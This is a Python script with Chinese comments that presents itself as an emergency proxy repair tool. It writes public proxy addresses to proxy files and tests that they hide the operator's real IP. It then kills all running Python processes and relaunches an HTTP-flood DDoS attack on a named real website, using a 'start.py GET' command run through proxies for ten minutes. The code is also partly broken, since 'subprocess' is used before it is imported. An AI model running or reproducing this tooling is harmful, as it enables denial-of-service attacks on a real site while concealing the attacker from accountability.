#!/usr/bin/env python3
"""
紧急代理修复工具
立即修复代理文件问题，保护真实IP
"""

import os
import requests

def create_emergency_proxy_file():
    """创建紧急代理文件"""
    print("🚨 紧急修复代理文件...")
    
    # 紧急代理列表（已知可用的代理）
    emergency_proxies = [
        '51.158.68.68:8811',
        '51.158.68.133:8811',
        '138.68.161.14:3128',
        '167.99.123.158:3128',
        '8.130.37.235:1081',
        '47.252.18.37:5060',
        '192.111.137.37:18762',
        '47.251.87.199:8081',
        '103.48.71.194:83',
        '121.43.109.88:80'
    ]
    
    # 创建代理文件
    proxy_files = [
        'files/proxies/proxies.txt',
        'files/proxies/http.txt',
        'proxies.txt'
    ]
    
    for proxy_file in proxy_files:
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(proxy_file), exist_ok=True)
            
            with open(proxy_file, 'w', encoding='utf-8') as f:
                f.write('# 紧急代理文件 - 自动生成\n')
                f.write('# 用于保护真实IP\n\n')
                for proxy in emergency_proxies:
                    f.write(f'http://{proxy}\n')
            
            print(f"✅ 已修复: {proxy_file}")
            
        except Exception as e:
            print(f"❌ 修复失败 {proxy_file}: {e}")
    
    print(f"💾 已创建 {len(emergency_proxies)} 个紧急代理")
    return True

def verify_proxy_protection():
    """验证代理保护效果"""
    print("\n🔒 验证代理保护...")
    
    # 获取真实IP
    try:
        response = requests.get('http://httpbin.org/ip', timeout=5)
        real_ip = response.json().get('origin', '未知')
        print(f"📡 您的真实IP: {real_ip}")
    except:
        print("❌ 无法获取真实IP")
        return False
    
    # 测试代理
    test_proxies = ['51.158.68.68:8811', '138.68.161.14:3128']
    
    for proxy in test_proxies:
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            proxy_ip = response.json().get('origin', '未知')
            
            if proxy_ip != real_ip:
                print(f"✅ 代理保护生效!")
                print(f"🔗 隐藏IP: {proxy_ip}")
                return True
            else:
                print(f"❌ 代理 {proxy} 无效")
        except:
            print(f"❌ 代理 {proxy} 连接失败")
    
    return False

def stop_current_attacks():
    """停止当前攻击"""
    print("\n🛑 停止当前攻击...")
    
    try:
        # 查找并停止python进程
        result = subprocess.run(['tasklist', '/fi', 'imagename eq python.exe'], 
                              capture_output=True, text=True)
        
        if 'python.exe' in result.stdout:
            subprocess.run(['taskkill', '/f', '/im', 'python.exe'], capture_output=True)
            print("✅ 已停止所有Python进程")
        else:
            print("ℹ️ 未找到运行的Python进程")
    except:
        print("❌ 停止进程失败")

def restart_safe_attack():
    """重启安全攻击"""
    print("\n🔄 重启安全DDoS攻击...")
    
    target = "https://www.kjqun.cn/"
    
    # 使用修复后的代理文件
    command = f'python start.py GET {target} 0 100 proxies.txt 100 600'
    print(f"📝 安全攻击命令: {command}")
    
    try:
        import subprocess
        process = subprocess.Popen(command, shell=True)
        print("✅ 安全攻击已重启")
        print("💡 攻击将使用代理保护，持续10分钟")
        return process
    except Exception as e:
        print(f"❌ 攻击重启失败: {e}")
        return None

def main():
    print("="*60)
    print("🚨 紧急代理修复工具")
    print("="*60)
    
    # 1. 修复代理文件
    create_emergency_proxy_file()
    
    # 2. 验证保护效果
    protection_ok = verify_proxy_protection()
    
    if not protection_ok:
        print("\n⚠️ 警告: 代理保护可能无效")
        print("💡 建议使用VPN进行额外保护")
    
    # 3. 用户选择
    print("\n🔧 操作选项:")
    print("1. 停止当前攻击，重启安全攻击")
    print("2. 继续当前攻击（风险较高）")
    print("3. 仅修复代理文件")
    
    choice = input("请选择 (1/2/3): ").strip()
    
    if choice == "1":
        stop_current_attacks()
        restart_safe_attack()
    elif choice == "2":
        print("⚠️ 继续当前攻击，风险自负")
        print("💡 攻击将在10分钟后自动停止")
    else:
        print("✅ 代理文件已修复完成")
    
    print("\n" + "="*60)
    print("📊 当前状态:")
    print("- 代理文件已修复")
    print("- 真实IP保护: ", "✅" if protection_ok else "❌")
    print("- 攻击状态: 运行中")
    print("="*60)

if __name__ == "__main__":
    main()